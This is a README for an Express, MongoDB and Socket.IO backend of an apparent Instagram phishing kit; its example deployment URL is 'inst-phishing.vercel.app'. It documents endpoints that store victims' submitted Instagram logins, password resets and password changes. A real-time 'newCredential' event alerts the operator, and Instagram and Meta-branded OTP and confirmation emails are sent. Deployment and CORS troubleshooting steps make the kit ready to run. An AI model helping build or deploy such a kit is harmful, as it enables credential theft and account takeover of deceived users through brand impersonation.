# Backend API

Node.js + Express REST API with MongoDB, Socket.IO, and Email notifications.

## Setup

```bash
npm install
cp .env.example .env
```

**Important**: Update the `.env` file with your actual values:
- MongoDB connection string
- Gmail credentials (use App Password, not regular password)
- Frontend URLs (local and production)

## Run

```bash
# Development (with auto-reload)
npm run dev

# Production
npm start
```

## Environment Variables

Create a `.env` file in the Backend directory:

```env
PORT=5000
NODE_ENV=development

# MongoDB Configuration
MONGO_USERNAME=your_username
MONGO_PASSWORD=your_password
MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/Instagram

# Gmail Configuration (for OTP and notifications)
GMAIL_ID=your_email@gmail.com
GMAIL_PASSWORD=your_app_password

# Frontend URLs - IMPORTANT for CORS
FRONTEND_URL_LOCAL=http://localhost:5173
FRONTEND_URL_PRODUCTION=https://your-project.vercel.app
```

### IMPORTANT: Update Frontend URLs

When deploying to production:

1. **Get your Vercel deployment URL** (e.g., `https://your-app.vercel.app`)
2. **Update `FRONTEND_URL_PRODUCTION`** in `.env`
3. **Restart your backend server**

Example:
```env
FRONTEND_URL_PRODUCTION=https://inst-phishing.vercel.app
```

## CORS Configuration

The backend is configured to accept requests from:
- Local development: `http://localhost:5173`
- Production: Your Vercel deployment URL (set in `.env`)

If you get CORS errors:
1. Check that `FRONTEND_URL_PRODUCTION` matches your exact Vercel URL
2. Make sure there are no trailing slashes
3. Restart the backend server after changing `.env`

## API Endpoints

### Health Check
| Method | Route         | Description          |
|--------|---------------|----------------------|
| GET    | /api/health   | Health / connectivity check |

### Instagram Login
| Method | Route                      | Description          |
|--------|----------------------------|----------------------|
| POST   | /api/instagram/login       | Save login credentials |
| GET    | /api/instagram/login       | Get all login records |
| PUT    | /api/instagram/login/:id   | Update login record |
| DELETE | /api/instagram/login/:id   | Delete login record |

### Forgot Password
| Method | Route                    | Description          |
|--------|--------------------------|----------------------|
| POST   | /api/instagram/forgot    | Save forgot password request |
| GET    | /api/instagram/forgot    | Get all forgot password records |

### Change Password
| Method | Route                           | Description          |
|--------|--------------------------------|----------------------|
| POST   | /api/instagram/changepassword  | Save password change + send email |
| GET    | /api/instagram/changepassword  | Get all password change records |

### OTP
| Method | Route                     | Description          |
|--------|---------------------------|----------------------|
| POST   | /api/instagram/otp/send   | Send OTP email |
| POST   | /api/instagram/otp/verify | Verify OTP code |

### Logs
| Method | Route                  | Description          |
|--------|------------------------|----------------------|
| GET    | /api/instagram/logs    | Get all request logs |

## WebSocket Events

The server emits real-time events via Socket.IO:

- `newCredential` - When a new login is saved
- `credentialUpdated` - When a login is updated
- `newLog` - When a new request is logged
- `logDeleted` - When a log is deleted

## Email Templates

The backend sends styled emails using:
- **Instagram logo**: S3-hosted image
- **Meta logo**: S3-hosted image
- **HTML templates** with Instagram branding

Email types:
1. **OTP Email** - For email verification
2. **Password Changed Email** - Confirmation after password change

## Folder Structure

```
src/
├── app.js              # Express app setup (middleware, routes, CORS)
├── server.js           # Entry point — starts HTTP + Socket.IO server
├── config/
│   ├── index.js        # Environment config
│   ├── db.js           # MongoDB connection
│   └── socket.js       # Socket.IO setup
├── controllers/
│   ├── health.controller.js
│   ├── instagram.controller.js
│   ├── logs.controller.js
│   └── changePassword.controller.js
├── middlewares/
│   ├── errorHandler.js
│   ├── notFound.js
│   └── requestLogger.js
├── models/
│   ├── InstaLogin.model.js
│   └── ChangePassword.model.js
├── routes/
│   ├── index.js             # Root router
│   ├── health.routes.js
│   ├── instagram.routes.js
│   └── logs.routes.js
└── utils/
    ├── response.js          # Reusable response helpers
    ├── logStore.js          # Request logging
    └── mailer.js            # Email sending with templates
```

## Deployment Checklist

### For Backend Deployment (e.g., Railway, Render, Heroku):

1. ✅ Set environment variables in hosting platform
2. ✅ Update `FRONTEND_URL_PRODUCTION` with your Vercel URL
3. ✅ Ensure MongoDB is accessible from your hosting provider
4. ✅ Use Gmail App Password (not regular password)
5. ✅ Set `NODE_ENV=production`

### For HTTPS Backend:

If deploying to a platform that provides HTTPS:
- Update your frontend `api-endpoints.js` to use `https://` instead of `http://`
- Example: `backendBaseUrl: 'https://your-backend.railway.app'`

### Testing CORS:

```bash
# Test from your deployed frontend
curl -X POST https://your-backend.com/api/instagram/login \
  -H "Origin: https://your-frontend.vercel.app" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}'
```

Should return data, not a CORS error.

## Troubleshooting

### CORS Error on Vercel
- **Problem**: "Access-Control-Allow-Origin" error
- **Solution**: Update `FRONTEND_URL_PRODUCTION` in `.env` and restart backend

### Mixed Content Error
- **Problem**: HTTPS frontend calling HTTP backend
- **Solution**: Deploy backend with HTTPS or use a reverse proxy with SSL

### Email Not Sending
- **Problem**: Gmail authentication error
- **Solution**: Use App Password, not regular Gmail password
  1. Enable 2FA on Gmail
  2. Generate App Password: https://myaccount.google.com/apppasswords
  3. Use that password in `GMAIL_PASSWORD`

### Socket.IO Not Connecting
- **Problem**: WebSocket connection failed
- **Solution**: Check CORS settings and ensure both origins are allowed

## License

ISC
